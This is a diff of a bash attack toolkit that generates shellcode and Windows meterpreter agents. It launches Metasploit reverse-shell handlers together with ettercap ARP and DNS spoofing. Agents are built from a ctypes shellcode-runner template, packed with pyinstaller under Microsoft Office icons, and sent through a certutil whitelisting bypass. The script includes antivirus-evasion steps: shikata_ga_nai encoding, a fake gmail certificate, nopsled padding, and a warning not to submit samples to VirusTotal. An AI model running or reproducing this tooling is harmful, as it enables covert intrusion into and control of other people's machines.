+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -7938,7 +8336,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           fi
         fi
    fi
@@ -8060,17 +8458,15 @@ sleep 1
 # display generated keys to user
 #
 echo ""
+echo "    Generated key:$NEW_UUID_3"
+sleep 1
 echo "    Generated key:$NEW_UUID_4"
 sleep 1
 echo "    Generated key:$NEW_UUID_5"
 sleep 1
-echo "    Generated key:$NEW_UUID_6"
-sleep 1
 echo "    Generated key:$NEW_UUID_1"
 sleep 1
 echo "    Generated key:$NEW_UUID_2"
-sleep 1
-echo "    Generated key:$NEW_UUID_3"
 sleep 1
 echo ""
 sleep 1
@@ -8079,19 +8475,16 @@ sleep 1
 
 echo "#!/usr/bin/python" > template.py
 echo "# -*- coding: utf-8 -*-" >> template.py
-echo "import win32api, win32con" >> template.py
 echo "# $NEW_UUID_1" >> template.py
-echo "import win32event, winerror" >> template.py
-echo "# $NEW_UUID_2" >> template.py
 echo "from ctypes import *" >> template.py
-echo "# $NEW_UUID_3" >> template.py
-echo "$NEW_UUID_4 = (\"$store\");" >> template.py
+echo "# $NEW_UUID_2" >> template.py
+echo "$NEW_UUID_3 = (\"$store\");" >> template.py
 echo "# gdGtdfASsTmFFsGbaaUnaDtaAvAaTkDKsHFdtGaAGmDoTkEkoT" >> template.py
-echo "$NEW_UUID_5 = create_string_buffer($NEW_UUID_4, len($NEW_UUID_4))" >> template.py
+echo "$NEW_UUID_4 = create_string_buffer($NEW_UUID_4, len($NEW_UUID_4))" >> template.py
 echo "# GSMsdMfhmDjkGjDhMhhMfdsAsasAffWgUkhWWjWjGfdOgEEjue" >> template.py
-echo "$NEW_UUID_6 = cast($NEW_UUID_5, CFUNCTYPE(c_void_p))" >> template.py
+echo "$NEW_UUID_5 = cast($NEW_UUID_5, CFUNCTYPE(c_void_p))" >> template.py
 echo "# HdFDgFDttPkSMcSsFSKaWdBfDBmkSkOSiBewSDoFtLmDeWsKvG" >> template.py
-echo "$NEW_UUID_6()" >> template.py
+echo "$NEW_UUID_5()" >> template.py
 sleep 2
 
      # check if pyinstaller its installed
@@ -8107,15 +8500,7 @@ sleep 2
 iCn=$(zenity --list --title "☠ REPLACE AGENT ICON ☠" --text "\nChose icon to use:" --radiolist --column "Pick" --column "Option" TRUE "Windows-Store.ico" FALSE "Windows-Logo.ico" FALSE "Microsoft-Word.ico" FALSE "Microsoft-Excel.ico" --width 320 --height 240) > /dev/null 2>&1
 
        #
-       # TODO: check if executes on windows systems
-       # http://zitstif.no-ip.org/?p=882
-       #
-       # install pycrypto
-       # wine msiexec /i pycrypto-2.3.win32-py2.6.msi
-       # try to crypt pyinstaller with --key MySuperSecretPassword
-       # http://sparkandshine.net/build-a-windows-executable-from-python-scripts-on-linux/
-       # http://tzutalin.blogspot.pt/2016/12/make-python-program-executable-and.html
-       # https://github.com/d3m3vilurr/Veil/blob/master/modules/common/supportfiles.py
+       # pyinstaller backend appl
        #
        xterm -T " PYINSTALLER " -geometry 110x23 -e "su $user -c '$arch c:/$PyIn/Python.exe c:/$PiWiN/pyinstaller.py --noconsole -i $IPATH/bin/icons/$iCn --onefile $IPATH/output/template.py'"
        cp $IPATH/output/dist/template.exe $IPATH/output/$N4m.exe
@@ -8224,7 +8609,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -8239,7 +8624,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
           rm report.log > /dev/null 2>&1
           cd $IPATH/
           else
-          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
 
 
@@ -8254,7 +8639,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'"
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -8269,7 +8654,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'"
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'"
           fi
         fi
    fi
@@ -8548,7 +8933,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -8563,7 +8948,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
           rm report.log > /dev/null 2>&1
           cd $IPATH/
           else
-          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
 
 
@@ -8578,7 +8963,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -8593,7 +8978,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           fi
         fi
    fi
@@ -8839,7 +9224,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
           rm report.log > /dev/null 2>&1
           cd $IPATH/
           else
-          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
 
 
@@ -8854,7 +9239,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -8869,7 +9254,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           fi
         fi
     fi
@@ -9170,7 +9555,7 @@ fi
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -9185,7 +9570,7 @@ fi
           rm report.log > /dev/null 2>&1
           cd $IPATH/
           else
-          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
 
 
@@ -9200,7 +9585,7 @@ fi
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -9215,7 +9600,7 @@ fi
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           fi
         fi
    fi
@@ -9449,7 +9834,7 @@ fi
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -9464,7 +9849,7 @@ fi
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
 
 
@@ -9479,7 +9864,7 @@ fi
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -9494,7 +9879,7 @@ fi
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           fi
         fi
    fi
@@ -9678,7 +10063,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -9693,7 +10078,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
 
 
@@ -9708,7 +10093,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -9723,7 +10108,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           fi
         fi
    fi
@@ -10018,7 +10403,7 @@ paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable 
 # input payload name
 N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 # input payload (agent) remote upload directory
-D1r=$(zenity --title="☠ Enter remote upload dir ☠" --text "The remote directory where to upload agent.\nWARNING:Use only Windows Enviroment Variables\n\nexample: %tmp%" --entry --width 330) > /dev/null 2>&1
+D1r=$(zenity --title="☠ Enter remote upload dir ☠" --text "The remote directory where to upload agent.\nWARNING:chose allways rewritable directorys\nWARNING:Use only Windows Enviroment Variables\n\nexample: %tmp%" --entry --width 330) > /dev/null 2>&1
 
 #
 # check if remote path was inputed correctlly (only enviroment variables accepted)
@@ -10027,10 +10412,11 @@ chec=`echo "$D1r" | grep "%"`
 # verify if '$chec' local var contains the '%' string (enviroment variable)
 if [ -z "$chec" ]; then
   echo "[x] WARNING: remote directory not supported .."
-  echo "[✔] Setting remote upload directory to: %tmp%"
+  echo "[✔] Setting remote upload directory to:%tmp%"
   D1r="%tmp%"
   sleep 2
 fi
+
 
 
 echo "[☠] Loading certutil appl_whitelisting_bypass"
@@ -10061,11 +10447,13 @@ cat << !
 
 #
 # use metasploit to build shellcode
+# HINT: use -n to add extra bits (random) of nopsled data to evade signature detection
 #
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd > $IPATH/output/chars.raw"
